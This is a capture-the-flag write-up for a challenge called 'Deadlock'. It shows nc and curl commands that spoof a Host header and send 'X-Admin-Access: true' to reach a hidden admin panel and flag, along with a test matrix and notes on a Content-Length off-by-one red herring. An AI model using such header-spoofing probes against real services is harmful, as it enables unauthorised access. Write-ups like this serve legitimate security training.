# Writeup: Deadlock

## Flag

`KubSTU{Pipelined_Smuggling_Success_5521}`

## TL;DR

The frontend on `159.194.199.67:5000` returns the same hardcoded Portal page
(`<h1>Portal</h1><p>Welcome. Admin is restricted.</p>`, `Content-Length: 50`
but a 51-byte body) **except** when all three of these are present at once:

- `Host: admin.challenge.local`  ← exactly this, no `:8081` suffix
- `X-Admin-Access: true`
- request path `/admin`

```bash
printf 'GET /admin HTTP/1.1\r\nHost: admin.challenge.local\r\nX-Admin-Access: true\r\nConnection: close\r\n\r\n' \
  | nc 159.194.199.67 5000
# HTTP/1.1 200 OK
# Content-Type: text/html
# Content-Length: 90
# Connection: keep-alive
#
# <h1>Admin Panel</h1><p>Flag: KubSTU{Pipelined_Smuggling_Success_5521}</p>
```

## What the screenshot was actually telling us

The challenge image (`solution/artifacts/2026-05-01_09.56.07.jpg`) is a phone
photo of Burp Suite. Most of the screen is blocked by a frog-hooded capybara
plushie, and at first glance the visible response is just the Portal page we
already see — easy to dismiss. Cropping/zooming the *Request* pane reveals
the request the author was actually testing:

```http
GET / HTTP/1.1
Host: admin.challenge.local:8081
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
X-Admin-Access: true
User-Agent: Mozilla/5.0 …
Accept: …
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Two non-standard fingerprints stand out:

1. `Host: admin.challenge.local:8081` — a custom virtual host that doesn't
   resolve publicly (the URL bar of the browser tab confirms the dev visited
   it locally). On the live deployment that vhost is bound on `:5000`, so the
   `:8081` suffix is a red herring left over from local testing — a Go
   `http.Server` matches `Host` literally including the port, so passing
   `admin.challenge.local:8081` doesn't match the route. Drop the port.
2. `X-Admin-Access: true` — a custom flag header. The handler also requires
   `true` literally; `false` returns the empty-body deadlock.

Path matters too: only `GET /admin` (not `/`) returns the flag once the host
and header are right.

## Why the off-by-one CL=50 / 51-byte body wasn't the answer

It is real (the Portal text is 51 bytes but `Content-Length: 50` is sent),
and a CL-strict pipelined parser does see `>HTTP/1.1 …` for every response
after the first — but the leaked byte is always literal `>` regardless of
path/method/host. With no controllable byte and no second observable parser
in the deployment, it's an implementation artifact, not the exploit. We
chased it for a long time before zooming on the screenshot.

## Header gating proven (matrix run against `159.194.199.67:5000`)

```text
Host=admin.challenge.local   X-Admin-Access:true   /admin   → Admin Panel + flag
Host=admin.challenge.local                          /admin   → empty (no body)
Host=admin.challenge.local:8081  X-Admin-Access:true /admin   → empty
Host=x                       X-Admin-Access:true   /admin   → empty
Host=admin                   X-Admin-Access:true   /admin   → empty
Host=admin.challenge.local   X-Admin-Access:false  /admin   → empty
Host=admin.challenge.local   X-Admin-Access:true   /        → Portal (default)
```

So both the Host and the boolean header are mandatory, and the path must be
`/admin`. Anything else falls through to the catch-all Portal handler (or to
the deadlock when the host matches but the header/path don't).

## Reproducer

`solution/probe.py` still works for the off-by-one demo. The actual exploit
is a one-liner:

```bash
curl -sS -H 'Host: admin.challenge.local' -H 'X-Admin-Access: true' \
  http://159.194.199.67:5000/admin
```
